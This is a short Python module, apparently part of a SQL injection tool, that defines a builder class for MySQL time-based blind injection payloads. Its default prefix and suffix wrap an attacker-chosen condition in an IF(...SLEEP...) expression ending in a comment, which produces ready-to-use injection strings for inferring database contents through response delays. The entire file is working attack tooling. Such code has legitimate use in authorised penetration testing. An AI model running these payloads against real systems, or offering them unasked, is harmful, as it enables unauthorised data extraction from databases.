"""Configurable time-based SQL payload builder."""

from dataclasses import dataclass

from .contracts import PayloadBuilder


@dataclass(frozen=True, slots=True)
class TimePayloadBuilder(PayloadBuilder):
    """Build a MySQL-style conditional sleep payload.

    The syntax is intentionally configurable because conditional sleep
    expressions differ between database engines and injection contexts.
    """

    sleep_seconds: float
    prefix: str = "' AND IF(("
    suffix: str = "),SLEEP({sleep_seconds}),0)--"

    def __post_init__(self) -> None:
        if self.sleep_seconds <= 0:
            raise ValueError("sleep_seconds must be greater than zero")
        if not self.prefix:
            raise ValueError("prefix cannot be empty")
        if not self.suffix:
            raise ValueError("suffix cannot be empty")
        try:
            self.suffix.format(sleep_seconds=self.sleep_seconds)
        except (KeyError, ValueError) as error:
            raise ValueError("suffix must accept the sleep_seconds placeholder") from error

    def build(self, condition: str) -> str:
        if not condition.strip():
            raise ValueError("condition cannot be empty")
        return f"{self.prefix}{condition}{self.suffix.format(sleep_seconds=self.sleep_seconds)}"
